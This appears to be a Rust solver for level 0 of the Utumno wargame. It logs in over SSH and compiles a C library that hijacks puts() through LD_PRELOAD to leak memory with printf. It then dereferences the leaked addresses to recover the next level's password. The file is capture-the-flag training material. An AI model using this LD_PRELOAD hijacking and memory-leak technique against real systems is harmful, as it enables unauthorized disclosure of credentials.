use crate::util::*;
use anyhow::Result;

pub fn solve(password: &str) -> Result<String> {
    
    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "utumno0", password)?;
    ssh.read_until("$ ")?;

    println!("creating a tmp folder and moving to it");
    ssh.write_line("cd $(mktemp -d)")?;
    ssh.read_until("$ ")?;

    let c_code_get_addresses = "#include <stdio.h>\nint puts(const char * str) { printf(\"%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x\\n\"); return 0; }";
    println!("creating a libary with the following code:\n{c_code_get_addresses}");
    ssh.write_line(&format!("echo -e \"{}\" > exp.c && gcc exp.c -o exp.so -fPIC -shared -ldl -m32", hex_encode(c_code_get_addresses.as_bytes())))?;
    ssh.read_until("$ ")?;

    ssh.write_line("LD_PRELOAD=$(pwd)/exp.so /utumno/utumno0")?;
    let result = ssh.read_until("$ ")?;
    println!("{result}");
    
    let possible_addrs: Vec<&str> = result.split(['\r','\n',',']).filter(|s| s.starts_with("0804")).collect();
    println!("possible string addresses: {:?}", possible_addrs);

    let mut c_code_get_values = "#include <stdio.h>\nint puts(const char * str) { ".to_string();
    for s in possible_addrs {
        c_code_get_values.push_str(&format!("printf(\"%s\\n\", 0x{s});"));
    }
    c_code_get_values.push_str("return 0; }");
    println!("creating a libary with the following code:\n{c_code_get_values}");
    ssh.write_line(&format!("echo -e \"{}\" > exp.c && gcc exp.c -o exp.so -fPIC -shared -ldl -m32", hex_encode(c_code_get_values.as_bytes())))?;
    ssh.read_until("$ ")?;

    ssh.write_line("LD_PRELOAD=$(pwd)/exp.so /utumno/utumno0")?;
    let result = ssh.read_until("$ ")?;
    println!("{result}");

    let result = result.split(['\r','\n',' ']).find(|s| s.chars().count() == 10).unwrap();
    println!("retrieved utumno1 pass '{result}'\n");

    Ok(result.to_string())
}